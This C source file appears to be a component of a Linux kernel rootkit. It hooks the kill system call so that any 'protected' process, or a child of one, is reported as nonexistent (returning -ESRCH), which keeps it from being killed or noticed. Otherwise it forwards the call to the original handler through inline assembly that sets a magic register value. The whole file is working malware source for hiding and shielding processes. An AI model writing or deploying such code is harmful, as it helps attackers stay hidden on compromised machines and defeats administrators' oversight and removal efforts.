#include "../inc/cmds.h"
#include "../inc/hook.h"
#include "../inc/util.h"

void *_kill = NULL;

asmlinkage int64_t h_kill(const struct pt_regs *r) {
  int64_t ret = 0;
  hfind(_kill, "__x64_sys_kill");

  // this also checks if the process' parent is protected
  if (is_process_protected((pid_t)r->di))
    return -ESRCH; // nah bro trust me it doesnt exist

  asm("mov %1, %%r15;"
      "mov %2, %%rdi;"
      "call *%3;"
      "mov %%rax, %0"
      : "=m"(ret)
      : "i"(SHRK_MAGIC_R15), "r"(r), "m"(_kill)
      : "%r15", "%rdi", "%rax");

  return ret;
}
